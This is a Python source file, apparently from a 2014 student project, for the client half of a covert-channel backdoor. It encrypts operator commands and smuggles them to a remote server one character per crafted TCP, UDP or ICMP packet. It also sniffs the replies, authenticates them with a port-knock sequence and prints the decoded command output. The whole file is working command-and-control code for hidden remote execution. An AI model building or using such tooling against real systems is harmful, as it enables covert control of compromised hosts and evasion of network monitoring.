"""
/*---------------------------------------------------------------------------------------
--  SOURCE FILE:    sendFunctions.py
--
--  PROGRAM:        sendFunctions
--
--  FUNCTIONS:      startClient(serverIP, proto, intf)
--					sendCommand(command)
--					recvThread()
--					authenticated(packet)
--					packetHandler(packet)
--					checkResult(ip, proto, data, pacType)
--					getCommand()
--
--  DATE:           December 7th, 2014
--
--  DESIGNERS:      Jacob Miner
--
--  PROGRAMMERS:    Jacob Miner
--
--  NOTES:			A module containing functions used by the client, for sending commands and 
--  				processing results
---------------------------------------------------------------------------------------*/
"""

import socket
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from struct import *
import sys
import threading
import pcapy
import config
import client
import utils

knockVal = 0
server = ""
protocol = ""
interface = ""

"""
/*------------------------------------------------------------------------------
--
--  FUNCTION:   startClient(serverIP, proto, intf)
--
--  DATE:       December 7th, 2014
--
--  DESIGNERS:  Jacob Miner  
--
--  PROGRAMMER: Jacob Miner 
--
--  INTERFACE:	startClient(serverIP, proto, intf)
--					serverIP - the servers IP address
--					proto - the protocol to use
--					intf - the interface for reading and writing
--
--  RETURNS:  	void
--
--  NOTES:  	begins the listening thread for results, then gets commands from
--  			the user and sends them to the server
------------------------------------------------------------------------------*/
"""
def startClient(serverIP, proto, intf):
	global server
	global protocol
	global interface

	server = serverIP
	protocol = proto
	interface = intf

	listenThread = threading.Thread(target=recvThread)
	listenThread.daemon = True
	listenThread.start()

	sendCommand(utils.encryptData("?connect"))
	print ""

	while(client.running):
		comm = getCommand()
		if comm != "":
			sendCommand(utils.encryptData(comm))
		else:
			client.running = False
			sys.exit()

"""
/*------------------------------------------------------------------------------
--
--  FUNCTION:   sendCommand(command)
--
--  DATE:       December 7th, 2014
--
--  DESIGNERS:  Jacob Miner  
--
--  PROGRAMMER: Jacob Miner 
--
--  INTERFACE:	sendCommand(command)
--					command - the user specified command to send
--
--  RETURNS:  	void
--
--  NOTES:  	sends the command to the server IP
--  
------------------------------------------------------------------------------*/
"""
def sendCommand(command):
	pswd = utils.encrypt(config.password)

	for c in command:
		send(utils.covertPacket(server, protocol, c, pswd), verbose=0)
	utils.finPacket(server, protocol, pswd)
	command = ""


"""
/*------------------------------------------------------------------------------
--
--  FUNCTION:   recvThread()
--
--  DATE:       December 7th, 2014
--
--  DESIGNERS:  Jacob Miner  
--
--  PROGRAMMER: Jacob Miner 
--
--  INTERFACE: 	recvThread()
--
--  RETURNS:  	void
--
--  NOTES:  	a thread that waits for results from the server and handles the
--  			packets sent back
------------------------------------------------------------------------------*/
"""
def recvThread():
	cap = pcapy.open_live(interface, 65536, 1, 0)
	fltr = protocol + " and ip src " + server
	cap.setfilter(fltr)

	while(client.running):
		(header, packet) = cap.next()
		packetHandler(packet)

"""
/*------------------------------------------------------------------------------
--
--  FUNCTION:   authenticated(packet)
--
--  DATE:       December 7th, 2014
--
--  DESIGNERS:  Jacob Miner  
--
--  PROGRAMMER: Jacob Miner 
--
--  INTERFACE:	authenticated(packet)
--					packet - the packet to authenticate
--
--  RETURNS:  	true if authenticated, false otherwise
--
--  NOTES:  	Checks for the knockcode, and returns true if the code comes in
--  			otherwise, returns false
------------------------------------------------------------------------------*/
"""
def authenticated(packet):
	global knockVal
	if knockVal < len(config.knock):
		if packet[3] == config.knock[knockVal]:
			knockVal += 1
			if knockVal == len(config.knock):
				return True
		else:
			knockVal = 0
			return False
	else:
		return True

"""
/*------------------------------------------------------------------------------
--
--  FUNCTION:   packetHandler(packet)
--
--  DATE:       December 7th, 2014
--
--  DESIGNERS:  Jacob Miner  
--
--  PROGRAMMER: Jacob Miner 
--
--  INTERFACE:	packetHandler(packet)
--					packet - the packet to handle
--
--  RETURNS:  	void
--
--  NOTES:  	checks if the packet is authenticated, then checks the results from
--  			within the packet
------------------------------------------------------------------------------*/
"""
def packetHandler(packet):
	pacType = utils.checkType(packet)
	ip, protoH, data = utils.stripPacket(packet, pacType)
	
	if authenticated(ip):
		checkResult(ip, protoH, data, pacType)

"""
/*------------------------------------------------------------------------------
--
--  FUNCTION:   checkResult(ip, proto, data, pacType)
--
--  DATE:       December 7th, 2014
--
--  DESIGNERS:  Jacob Miner  
--
--  PROGRAMMER: Jacob Miner 
--
--  INTERFACE:	checkResult(ip, proto, data, pacType)
--						ip - the ip header of the packet
--						proto - the protocol specific header of the packet
--						data - the payload of the packet
--						pacType - the type of protocol (tcp, udp, icmp)
--
--  RETURNS:  	void
--
--  NOTES:  	Decrypts covert data from the packet, and prints it out.
--  
------------------------------------------------------------------------------*/
"""
def checkResult(ip, proto, data, pacType):
	character = ''

	if pacType == 'tcp':
		character = proto[2]
	elif pacType == 'udp':
		character = proto[3]
	elif pacType == 'icmp':
		character = proto[2]

	if character < 256:
		character = utils.decryptData(character)
		if (ord(character) > 31 and ord(character) < 127) or ord(character) == 13 or ord(character) == 10:
			sys.stderr.write(character) 

"""
/*------------------------------------------------------------------------------
--
--  FUNCTION:   getCommand()
--
--  DATE:       December 7th, 2014
--
--  DESIGNERS:  Jacob Miner  
--
--  PROGRAMMER: Jacob Miner 
--
--  INTERFACE:	getCommand()
--
--  RETURNS:	comm - the command input by the user
--
--  NOTES:  	uses raw_input to get the user's command.
--  
------------------------------------------------------------------------------*/
"""
def getCommand():
	try: 
		comm = raw_input()
	except KeyboardInterrupt:
		return ""
	return comm
